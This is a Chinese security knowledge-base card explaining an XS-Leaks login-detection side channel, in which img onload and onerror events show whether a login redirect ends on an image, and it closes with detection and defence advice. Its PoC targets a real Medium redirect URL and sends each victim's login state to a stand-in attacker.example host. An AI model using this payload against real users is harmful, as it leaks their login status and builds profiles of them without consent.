---
id: web-generic-xs-leaks-img-onload-onerror-login-detect
title: XS-Leaks 登录状态探测：img onload/onerror 判断重定向终点是否为图片
type: scenario
domain: web
path: web/generic/xs-leaks
technique: xs-leaks-img-load-error-oracle
tags:
- web
- xs-leaks
- side-channel
- login-detection
- image
- onload
- onerror
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V218
  verified_at: '2026-11-07T04:52:12+08:00'
  notes: 已对照原文核对：img加载Medium login-redirect，favicon图片触发onload/登录页HTML触发onerror判断登录态一致；未复跑。dup-scan与本组其他XS-Leaks卡均为related，保留。
url: /docs/web/generic/xs-leaks/web-generic-xs-leaks-img-onload-onerror-login-detect/
draft: false
kb_aliases:
- 登录态侧信道
- login detection XS-Leaks
- onload onerror oracle
- 图片加载事件探测
- browserleaks social
---

## 一句话结论

当目标站点在“已登录”和“未登录”状态下把同一个 URL 重定向到不同类型的内容（例如登录后跳到 favicon/logo 图片，未登录跳到登录页 HTML）时，攻击页用 `<img src="该 URL">` 加载它：触发 `onload` 说明最终资源是图片即已登录，触发 `onerror` 说明不是图片即未登录；跨域图片的 `load/error` 事件不受同源策略限制，于是登录状态被泄露。

## 原理

- `<img>` 元素在加载跨域资源时，不要求 CORS；无论是否同源，只要最终响应能被解码为图片就触发 `load`，否则（HTTP 错误、非图片内容、解码失败、重定向到 HTML 等）触发 `error`。
- 浏览器会自动跟随 3xx 重定向。许多站点有“登录后跳回原页面/默认资源”的登录重定向端点，例如 `?redirectUrl=...`；若该端点对已登录用户直接 302 到目标资源，对未登录用户 302 到登录页，则最终资源的类型暴露了登录状态。
- 图片解码检查是关键：服务端即使返回 200，只要内容是 HTML，`<img>` 仍会触发 `error`；因此该 oracle 判断的是“最终内容是否为一张可解码图片”，而不是状态码。
- 攻击者不需要读取响应体，只需要事件回调；`load/error` 事件在跨域场景下仍然触发，且可以把结果通过 `Image().src` 回传到攻击者服务器。

## 触发条件

- 目标存在一个会随登录态重定向到不同资源类型的端点；登录后终点是图片，未登录终点是 HTML（或相反的差异）。
- 跨站图片请求会携带受害者的目标站点 Cookie，否则服务端无法区分登录态；因此需要 Cookie 未设置 `SameSite=Lax/Strict`，或设置为 `SameSite=None; Secure`。
- 攻击页能在受害者浏览器中执行脚本并加载图片（普通页面即可，无需目标站 CSP 配合）。
- 目标资源没有被 `Cross-Origin-Resource-Policy` 等策略禁止跨站嵌入。

## 利用步骤

1. 找到目标站点登录态相关的重定向端点（登录跳转、`redirectUrl`、`/m/login-redirect` 等）。
2. 用已登录/未登录两种会话分别请求，确认最终重定向目标是图片还是 HTML，且类型差异稳定。
3. 在攻击页构造 `<img>` 指向该端点，注册 `onload` 与 `onerror` 回调。
4. 在回调中把 `logged-in`/`not-logged-in` 结果回传到攻击者服务器或写入页面。
5. 可对多个站点批量使用，得到受害者的账号存在性/登录状态画像。

## PoC

```html
<img
  src="https://medium.com/m/login-redirect?redirectUrl=https%3A%2F%2Fmedium.com%2Ffavicon.ico"
  onerror="new Image().src='https://attacker.example/leak?state=not_logged_in'"
  onload="new Image().src='https://attacker.example/leak?state=logged_in'">
```

说明：示例沿用文章给出的 Medium 登录重定向形态；已登录时最终跳到 `favicon.ico` 图片，`/favicon.ico` 被解码成功触发 `onload`；未登录时跳到登录页 HTML，触发 `onerror`。实际目标需要自行确认重定向终点类型。

## 变体与关联

- 变体：把 `onload/onerror` 结果写进 `location`、`fetch`、`navigator.sendBeacon`，避免依赖图片回连。
- 变体：用 `<link rel="preload" as="image">` 或 CSS `background-image` 的加载时机做类似判断。
- 变体：不仅判断登录态，也可判断“某用户/某资源是否存在”——只要存在与不存在时最终资源类型不同。
- 关联：[[web-generic-xs-leaks-script-onload-status-code-oracle]]（改用 `<script>` 时判断的是响应状态码而非图片类型）。
- 关联：[[web-generic-xs-leaks-cache-probing]]（不依赖重定向终点类型，改用缓存命中与否做 oracle）。
- 边界：Cookie 设置 `SameSite=Lax/Strict` 时跨站图片请求不带 Cookie，服务端无法区分登录态；`Cross-Origin-Resource-Policy: same-origin` 会阻止跨站加载；目标对登录/未登录返回完全相同的资源类型时不成立。

## 检测与防御

- 检测：同一图片 URL 在短时间内被大量跨站页面引用并伴随异常回连；登录重定向端点出现 `Sec-Fetch-Site: cross-site`、`Sec-Fetch-Dest: image` 的请求。
- 防御：会话 Cookie 设置 `SameSite=Lax` 或 `Strict`（跨站子资源请求不带 Cookie）；对登录跳转端点使用 Fetch Metadata 拒绝跨站请求。
- 加固：对已登录/未登录返回一致的响应类型和状态码，不要用图片/HTML 类型差异表达登录态；对敏感资源设置 `Cross-Origin-Resource-Policy: same-origin`；登录跳转使用一次性、不可被跨站预取的状态 Token。
